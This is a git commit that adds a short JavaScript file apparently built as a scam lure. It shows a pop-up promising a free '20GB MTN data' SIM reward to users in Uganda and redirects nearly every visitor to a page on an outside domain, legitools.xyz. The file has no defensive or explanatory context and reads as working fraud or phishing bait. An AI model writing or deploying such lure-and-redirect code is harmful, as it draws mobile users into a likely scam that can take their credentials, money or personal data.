7cb05bf50ae1030eecf45d75d0e068d121b8d43a
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-11-24 02:44:08 -0800

    Create uganda.simrward-20gbdata-mtn.js

---
+++ uganda.simrward-20gbdata-mtn.js
@@ -0,0 +1,6 @@
+
+var password = '20GB mtn data reward'
+password=prompt('SMS: CHECK IF YOU ARE ELIGIBLE TO GET FREE 20GB DATA MTN OLD SIM REWARD');
+if (password != '20GB mtn data reward') {
+location.href='https://legitools.xyz/uganda.simrward-20gbdata-mtn.html';
+}
